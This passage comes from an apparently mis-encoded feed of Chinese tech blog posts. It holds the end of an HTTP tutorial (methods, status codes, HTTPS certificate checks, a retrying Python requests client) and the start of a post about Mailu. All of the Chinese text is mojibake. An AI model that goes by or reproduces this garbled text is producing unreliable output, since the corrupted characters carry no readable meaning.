<table><thead><tr><th>æ–¹æ³•</th><th>å¹‚ç­‰æ€§</th><th>å®‰å…¨æ€§</th><th>ç”¨é€”</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>âœ…</td><td>âœ…</td><td>è·å–èµ„æº</td><td>è·å–ç”¨æˆ·ä¿¡æ¯</td></tr><tr><td><strong>POST</strong></td><td>âŒ</td><td>âŒ</td><td>åˆ›å»ºèµ„æº</td><td>ç”¨æˆ·æ³¨å†Œ</td></tr><tr><td><strong>PUT</strong></td><td>âœ…</td><td>âŒ</td><td>å…¨é‡æ›´æ–°</td><td>ä¿®æ”¹ç”¨æˆ·èµ„æ–™</td></tr><tr><td><strong>PATCH</strong></td><td>âŒ</td><td>âŒ</td><td>å±€éƒ¨æ›´æ–°</td><td>ä¿®æ”¹ç”¨æˆ·å</td></tr><tr><td><strong>DELETE</strong></td><td>âœ…</td><td>âŒ</td><td>åˆ é™¤èµ„æº</td><td>åˆ é™¤è´¦å·</td></tr><tr><td><strong>HEAD</strong></td><td>âœ…</td><td>âœ…</td><td>è·å–å¤´éƒ¨ï¼ˆä¸è¿”å›Bodyï¼‰</td><td>æ£€æŸ¥èµ„æºæ˜¯å¦å­˜åœ¨</td></tr><tr><td><strong>OPTIONS</strong></td><td>âœ…</td><td>âœ…</td><td>é¢„æ£€è¯·æ±‚ï¼ŒæŸ¥çœ‹æ”¯æŒçš„æ–¹æ³•</td><td>CORSè·¨åŸŸé¢„æ£€</td></tr></tbody></table>
<blockquote>
<p>ğŸ“Œ <strong>å¹‚ç­‰æ€§</strong>ï¼šå¤šæ¬¡æ‰§è¡Œç»“æœç›¸åŒï¼ˆå¦‚PUTå¤šæ¬¡ç»“æœä¸€è‡´ï¼ŒPOSTæ¯æ¬¡éƒ½æ–°å»ºèµ„æºï¼‰</p>
</blockquote>
<h3 data-id="heading-11">JavaScript Fetch APIç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// GETè¯·æ±‚è·å–æ•°æ®</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params">userId</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">${userId}</span>`</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
        <span class="hljs-attr">headers</span>: {
            <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'application/json'</span>,
            <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer token123'</span>
        }
    });
    
    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">${response.status}</span>`</span>);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
}

<span class="hljs-comment">// POSTè¯·æ±‚åˆ›å»ºèµ„æº</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params">userData</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/users'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-attr">headers</span>: {
            <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
        },
        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userData)
    });
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
}

<span class="hljs-comment">// è°ƒç”¨ç¤ºä¾‹</span>
<span class="hljs-title function_">getUser</span>(<span class="hljs-number">123</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data));
<span class="hljs-title function_">createUser</span>({<span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">'zhangsan@example.com'</span>});
</code></pre>
<hr/>
<h2 data-id="heading-12">å…­ã€HTTPçŠ¶æ€ç ï¼ˆStatus Codesï¼‰</h2>
<p>çŠ¶æ€ç æ˜¯æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”çŠ¶æ€ï¼Œç”±3ä½æ•°å­—ç»„æˆï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d95e49601474925a259713e5bd33daf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=BtZXPHCFVlb5WIL%2FazvKWD2i4jY%3D" alt="image (1).png" loading="lazy"/></p>
<h3 data-id="heading-13">å¸¸è§çŠ¶æ€ç é€ŸæŸ¥è¡¨</h3>






































































<table><thead><tr><th>ä»£ç </th><th>å«ä¹‰</th><th>åœºæ™¯è¯´æ˜</th></tr></thead><tbody><tr><td><strong>200</strong> OK</td><td>è¯·æ±‚æˆåŠŸ</td><td>æœ€å¸¸è§çš„æˆåŠŸçŠ¶æ€</td></tr><tr><td><strong>201</strong> Created</td><td>åˆ›å»ºæˆåŠŸ</td><td>POSTåˆ›å»ºèµ„æºåè¿”å›</td></tr><tr><td><strong>301</strong> Moved Permanently</td><td>æ°¸ä¹…é‡å®šå‘</td><td>ç½‘ç«™æ¢åŸŸå</td></tr><tr><td><strong>302</strong> Found</td><td>ä¸´æ—¶é‡å®šå‘</td><td>æœªç™»å½•è·³è½¬ç™»å½•é¡µ</td></tr><tr><td><strong>304</strong> Not Modified</td><td>æœªä¿®æ”¹</td><td>æµè§ˆå™¨ç¼“å­˜æœ‰æ•ˆ</td></tr><tr><td><strong>400</strong> Bad Request</td><td>è¯·æ±‚è¯­æ³•é”™è¯¯</td><td>å‚æ•°æ ¼å¼ä¸å¯¹</td></tr><tr><td><strong>401</strong> Unauthorized</td><td>æœªè®¤è¯</td><td>ç¼ºå°‘Token</td></tr><tr><td><strong>403</strong> Forbidden</td><td>ç¦æ­¢è®¿é—®</td><td>æƒé™ä¸è¶³</td></tr><tr><td><strong>404</strong> Not Found</td><td>èµ„æºä¸å­˜åœ¨</td><td>é¡µé¢æˆ–APIæ‰¾ä¸åˆ°</td></tr><tr><td><strong>500</strong> Internal Server Error</td><td>æœåŠ¡å™¨å†…éƒ¨é”™è¯¯</td><td>ä»£ç æŠ›å¼‚å¸¸</td></tr><tr><td><strong>502</strong> Bad Gateway</td><td>ç½‘å…³é”™è¯¯</td><td>Nginxè½¬å‘å¤±è´¥</td></tr><tr><td><strong>503</strong> Service Unavailable</td><td>æœåŠ¡ä¸å¯ç”¨</td><td>æœåŠ¡å™¨è¿‡è½½æˆ–ç»´æŠ¤</td></tr></tbody></table>
<h3 data-id="heading-14">Pythonå¤„ç†ä¸åŒçŠ¶æ€ç </h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> HTTPError

<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_request</span>(<span class="hljs-params">url</span>):
    <span class="hljs-keyword">try</span>:
        response = requests.get(url)
        response.raise_for_status()  <span class="hljs-comment"># è‡ªåŠ¨æŠ›å‡º4xx/5xxå¼‚å¸¸</span>
        
        <span class="hljs-comment"># å¤„ç†ç‰¹å®šçŠ¶æ€ç </span>
        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" è¯·æ±‚æˆåŠŸ"</span>)
            <span class="hljs-keyword">return</span> response.json()
        <span class="hljs-keyword">elif</span> response.status_code == <span class="hljs-number">304</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" ä½¿ç”¨ç¼“å­˜æ•°æ®"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
            
    <span class="hljs-keyword">except</span> HTTPError <span class="hljs-keyword">as</span> e:
        status = e.response.status_code
        
        <span class="hljs-keyword">if</span> status == <span class="hljs-number">404</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" èµ„æºä¸å­˜åœ¨ï¼Œè¯·æ£€æŸ¥URL"</span>)
        <span class="hljs-keyword">elif</span> status == <span class="hljs-number">429</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•"</span>)
        <span class="hljs-keyword">elif</span> status &gt;= <span class="hljs-number">500</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" æœåŠ¡å™¨é”™è¯¯ï¼Œè¯·è”ç³»ç®¡ç†å‘˜"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" è¯·æ±‚å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
            
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># æµ‹è¯•</span>
safe_request(<span class="hljs-string">"https://api.github.com/users/nonexistent-user-12345"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-15">ä¸ƒã€HTTP vs HTTPSï¼šå®‰å…¨ä¼ è¾“</h2>
<p>HTTPS = HTTP + SSL/TLSåŠ å¯†å±‚ï¼Œé»˜è®¤ç«¯å£443ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a3a57e3fcf74105966133f5dc4a9642~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=geXUsbq1e5XjcCJflUfP7wemyxU%3D" alt="image (3).png" loading="lazy"/></p>
<h3 data-id="heading-16">HTTPSçš„æ ¸å¿ƒä»·å€¼</h3>
<ol>
<li><strong>åŠ å¯†ï¼ˆEncryptionï¼‰</strong>ï¼šé˜²æ­¢çªƒå¬ï¼Œä¿æŠ¤éšç§æ•°æ®</li>
<li><strong>å®Œæ•´æ€§ï¼ˆIntegrityï¼‰</strong>ï¼šé˜²æ­¢ç¯¡æ”¹ï¼Œç¡®ä¿æ•°æ®æœªè¢«ä¿®æ”¹</li>
<li><strong>èº«ä»½éªŒè¯ï¼ˆAuthenticationï¼‰</strong>ï¼šéªŒè¯æœåŠ¡å™¨èº«ä»½ï¼Œé˜²æ­¢é’“é±¼ç½‘ç«™</li>
</ol>
<h3 data-id="heading-17">æ£€æŸ¥ç½‘ç«™HTTPSé…ç½®</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> ssl
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_ssl_certificate</span>(<span class="hljs-params">hostname</span>):
    <span class="hljs-string">"""
    æ£€æŸ¥ç½‘ç«™çš„SSLè¯ä¹¦ä¿¡æ¯
    """</span>
    context = ssl.create_default_context()
    <span class="hljs-keyword">with</span> socket.create_connection((hostname, <span class="hljs-number">443</span>), timeout=<span class="hljs-number">5</span>) <span class="hljs-keyword">as</span> sock:
        <span class="hljs-keyword">with</span> context.wrap_socket(sock, server_hostname=hostname) <span class="hljs-keyword">as</span> ssock:
            cert = ssock.getpeercert()
            cipher = ssock.cipher()
            version = ssock.version()
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" åŸŸå: <span class="hljs-subst">{hostname}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" è¯ä¹¦é¢å‘è€…: <span class="hljs-subst">{cert.get(<span class="hljs-string">'issuer'</span>)}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" æœ‰æ•ˆæœŸè‡³: <span class="hljs-subst">{cert.get(<span class="hljs-string">'notAfter'</span>)}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" åè®®ç‰ˆæœ¬: <span class="hljs-subst">{version}</span>"</span>)  <span class="hljs-comment"># å¦‚ TLSv1.3</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" åŠ å¯†å¥—ä»¶: <span class="hljs-subst">{cipher[<span class="hljs-number">0</span>]}</span>"</span>)

<span class="hljs-comment"># æ£€æŸ¥ç¤ºä¾‹</span>
check_ssl_certificate(<span class="hljs-string">"www.google.com"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-18">å…«ã€å®æˆ˜ï¼šæ„å»ºå®Œæ•´çš„HTTPå®¢æˆ·ç«¯</h2>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç”Ÿäº§çº§çš„Python HTTPå®¢æˆ·ç«¯ç¤ºä¾‹ï¼Œå±•ç¤ºäº†æœ€ä½³å®è·µï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter
<span class="hljs-keyword">from</span> urllib3.util.retry <span class="hljs-keyword">import</span> Retry
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Any</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPClient</span>:
    <span class="hljs-string">"""
    ç”Ÿäº§çº§HTTPå®¢æˆ·ç«¯å°è£…
    åŠŸèƒ½ï¼šè‡ªåŠ¨é‡è¯•ã€è¶…æ—¶æ§åˆ¶ã€æ—¥å¿—è®°å½•ã€è¿æ¥æ± 
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_retries: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span>, timeout: <span class="hljs-built_in">int</span> = <span class="hljs-number">30</span></span>):
        self.session = requests.Session()
        self.timeout = timeout
        
        <span class="hljs-comment"># é…ç½®é‡è¯•ç­–ç•¥</span>
        retry_strategy = Retry(
            total=max_retries,
            backoff_factor=<span class="hljs-number">1</span>,  <span class="hljs-comment"># é‡è¯•é—´éš” 1s, 2s, 4s...</span>
            status_forcelist=[<span class="hljs-number">429</span>, <span class="hljs-number">500</span>, <span class="hljs-number">502</span>, <span class="hljs-number">503</span>, <span class="hljs-number">504</span>],
            allowed_methods=[<span class="hljs-string">"HEAD"</span>, <span class="hljs-string">"GET"</span>, <span class="hljs-string">"OPTIONS"</span>, <span class="hljs-string">"POST"</span>, <span class="hljs-string">"PUT"</span>]
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=<span class="hljs-number">10</span>,
            pool_maxsize=<span class="hljs-number">10</span>
        )
        
        self.session.mount(<span class="hljs-string">"http://"</span>, adapter)
        self.session.mount(<span class="hljs-string">"https://"</span>, adapter)
        
        <span class="hljs-comment"># è®¾ç½®é€šç”¨è¯·æ±‚å¤´</span>
        self.session.headers.update({
            <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (compatible; MyBot/1.0)'</span>,
            <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'application/json'</span>,
            <span class="hljs-string">'Accept-Encoding'</span>: <span class="hljs-string">'gzip, deflate'</span>
        })
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span>, params: <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>] = <span class="hljs-literal">None</span>, **kwargs</span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-string">"""
        å‘é€GETè¯·æ±‚
        """</span>
        <span class="hljs-keyword">try</span>:
            response = self.session.get(
                url, 
                params=params, 
                timeout=self.timeout,
                **kwargs
            )
            response.raise_for_status()
            <span class="hljs-keyword">return</span> response.json()
            
        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:
            logging.error(<span class="hljs-string">f" è¯·æ±‚è¶…æ—¶: <span class="hljs-subst">{url}</span>"</span>)
        <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:
            logging.error(<span class="hljs-string">f" è¿æ¥é”™è¯¯: <span class="hljs-subst">{url}</span>"</span>)
        <span class="hljs-keyword">except</span> requests.exceptions.HTTPError <span class="hljs-keyword">as</span> e:
            logging.error(<span class="hljs-string">f" HTTPé”™è¯¯ <span class="hljs-subst">{e.response.status_code}</span>: <span class="hljs-subst">{url}</span>"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logging.error(<span class="hljs-string">f" æœªçŸ¥é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post_json</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span>, data: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-string">"""
        å‘é€JSONæ ¼å¼çš„POSTè¯·æ±‚
        """</span>
        headers = {<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>}
        <span class="hljs-keyword">try</span>:
            response = self.session.post(
                url, 
                json=data, 
                headers=headers,
                timeout=self.timeout
            )
            response.raise_for_status()
            <span class="hljs-keyword">return</span> response.json()
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logging.error(<span class="hljs-string">f"POSTè¯·æ±‚å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å…³é—­è¿æ¥æ± """</span>
        self.session.close()

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    client = HTTPClient(max_retries=<span class="hljs-number">3</span>)
    
    <span class="hljs-comment"># GETè¯·æ±‚</span>
    user_data = client.get(<span class="hljs-string">"https://api.github.com/users/octocat"</span>)
    <span class="hljs-keyword">if</span> user_data:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”¨æˆ·: <span class="hljs-subst">{user_data[<span class="hljs-string">'login'</span>]}</span>, ç²‰ä¸: <span class="hljs-subst">{user_data[<span class="hljs-string">'followers'</span>]}</span>"</span>)
    
    <span class="hljs-comment"># POSTè¯·æ±‚</span>
    result = client.post_json(<span class="hljs-string">"https://httpbin.org/post"</span>, {<span class="hljs-string">"key"</span>: <span class="hljs-string">"value"</span>})
    <span class="hljs-keyword">if</span> result:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å“åº”æ•°æ®: <span class="hljs-subst">{result[<span class="hljs-string">'json'</span>]}</span>"</span>)
    
    client.close()
</code></pre>
<hr/>
<h2 data-id="heading-19">ä¹ã€HTTPæ€§èƒ½ä¼˜åŒ–æŠ€å·§</h2>
<h3 data-id="heading-20">1. å¯ç”¨å‹ç¼©ï¼ˆå‡å°‘70%ä¼ è¾“ä½“ç§¯ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¯·æ±‚æ—¶å£°æ˜æ¥å—gzipå‹ç¼©</span>
headers = {<span class="hljs-string">'Accept-Encoding'</span>: <span class="hljs-string">'gzip, deflate, br'</span>}
response = requests.get(url, headers=headers)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŸå§‹å¤§å°: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(response.content)}</span> bytes"</span>)
</code></pre>
<h3 data-id="heading-21">2. ä½¿ç”¨è¿æ¥æ± ï¼ˆé¿å…é¢‘ç¹å»ºç«‹TCPè¿æ¥ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># requests.Sessionè‡ªåŠ¨ç»´æŠ¤è¿æ¥æ± </span>
session = requests.Session()
<span class="hljs-comment"># å¤ç”¨sessionå‘é€å¤šä¸ªè¯·æ±‚ï¼Œæ¯”æ¯æ¬¡æ–°å»ºrequests.get()å¿«3-5å€</span>
</code></pre>
<h3 data-id="heading-22">3. åˆç†è®¾ç½®ç¼“å­˜ç­–ç•¥</h3>
<pre><code class="hljs language-http" lang="http"># å“åº”å¤´è®¾ç½®
Cache-Control: max-age=3600, public  # ç¼“å­˜1å°æ—¶
ETag: "33a64df5"                    # åå•†ç¼“å­˜æ ‡è¯†
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
</code></pre>
<h3 data-id="heading-23">4. HTTP/2 æœåŠ¡å™¨æ¨é€ï¼ˆServer Pushï¼‰</h3>
<p>è™½ç„¶ç°ä»£Webæ¨èä½¿ç”¨é¢„åŠ è½½ï¼ˆPreloadï¼‰æ›¿ä»£ï¼Œä½†äº†è§£å…¶åŸç†æœ‰åŠ©äºç†è§£HTTP/2çš„å¤šè·¯å¤ç”¨ä¼˜åŠ¿ã€‚</p>
<hr/>
<h2 data-id="heading-24">åã€æ€»ç»“</h2>
<p>HTTPåè®®æ˜¯Webå¼€å‘çš„åŸºçŸ³ï¼Œç†è§£å®ƒçš„å·¥ä½œåŸç†å¯¹å‰åç«¯å¼€å‘éƒ½è‡³å…³é‡è¦ï¼š</p>





























<table><thead><tr><th>çŸ¥è¯†ç‚¹</th><th>æ ¸å¿ƒè¦ç‚¹</th></tr></thead><tbody><tr><td><strong>æ¨¡å‹</strong></td><td>è¯·æ±‚-å“åº”æ¨¡å¼ï¼Œæ— çŠ¶æ€åè®®</td></tr><tr><td><strong>ç‰ˆæœ¬</strong></td><td>HTTP/1.1ä½¿ç”¨æœ€å¹¿æ³›ï¼ŒHTTP/2æ€§èƒ½æœ€ä¼˜ï¼ŒHTTP/3æ˜¯æœªæ¥è¶‹åŠ¿</td></tr><tr><td><strong>æ–¹æ³•</strong></td><td>GETç”¨äºæŸ¥è¯¢ï¼ŒPOSTç”¨äºåˆ›å»ºï¼ŒPUT/PATCHç”¨äºæ›´æ–°ï¼ŒDELETEç”¨äºåˆ é™¤</td></tr><tr><td><strong>çŠ¶æ€ç </strong></td><td>2xxæˆåŠŸï¼Œ3xxé‡å®šå‘ï¼Œ4xxå®¢æˆ·ç«¯é”™ï¼Œ5xxæœåŠ¡å™¨é”™</td></tr><tr><td><strong>å®‰å…¨</strong></td><td>ç”Ÿäº§ç¯å¢ƒåŠ¡å¿…ä½¿ç”¨HTTPSï¼ˆTLS 1.2+ï¼‰</td></tr></tbody></table>
<blockquote>
<p><strong>å­¦ä¹ å»ºè®®</strong>ï¼šä½¿ç”¨æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·ï¼ˆF12 â†’ Networkæ ‡ç­¾ï¼‰è§‚å¯ŸçœŸå®ç½‘ç«™çš„HTTPè¯·æ±‚ï¼Œè¿™æ˜¯æœ€ç›´è§‚çš„å­¦ä¹ æ–¹å¼ã€‚</p>
</blockquote>
<hr/>
<p><strong>å‚è€ƒå›¾è¡¨æ–‡ä»¶ï¼š</strong></p>
<ul>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTPå·¥ä½œæµç¨‹å›¾</a></li>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTPçŠ¶æ€ç è¯¦è§£</a></li>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTPæ¼”è¿›å²</a></li>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTP vs HTTPSå¯¹æ¯”</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‡ªå·±æ­é‚®ä»¶æœåŠ¡å™¨æœ‰å¤šéš¾ï¼Ÿæˆ‘ç”¨ Mailu è·‘é€šäº†æ•´å¥—ä¼ä¸šé‚®ç®±]]></title>    <link>https://juejin.cn/post/7602488966610108454</link>    <guid>https://juejin.cn/post/7602488966610108454</guid>    <pubDate>2026-02-03T15:11:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966610108454" data-draft-id="7602154088476819494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‡ªå·±æ­é‚®ä»¶æœåŠ¡å™¨æœ‰å¤šéš¾ï¼Ÿæˆ‘ç”¨ Mailu è·‘é€šäº†æ•´å¥—ä¼ä¸šé‚®ç®±"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-03T15:11:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GetcharZp"/> <meta itemprop="url" content="https://juejin.cn/user/4328150938692264"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‡ªå·±æ­é‚®ä»¶æœåŠ¡å™¨æœ‰å¤šéš¾ï¼Ÿæˆ‘ç”¨ Mailu è·‘é€šäº†æ•´å¥—ä¼ä¸šé‚®ç®±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4328150938692264/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GetcharZp
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T15:11:43.000Z" title="Tue Feb 03 2026 15:11:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body 